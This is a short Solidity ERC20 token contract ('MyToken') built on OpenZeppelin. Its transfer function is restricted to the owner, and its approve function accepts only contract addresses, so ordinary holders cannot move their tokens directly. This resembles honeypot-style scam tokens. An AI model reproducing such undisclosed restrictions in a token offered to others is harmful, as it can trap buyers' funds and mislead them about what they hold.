// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MyToken is ERC20 {
    address public owner;
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.sender, 1000000 * 10 ** decimals());
        owner = msg.sender;
    }
    
    function isContract(address addrTaiKhoanNhan) public view returns(bool){
        uint32 size;
        assembly {
            size := extcodesize(addrTaiKhoanNhan)
        }
        return (size > 0);
    }
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        require(isContract(spender));
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    
    function transfer(address recipient, uint256 amount) public virtual override onlyOwner  returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}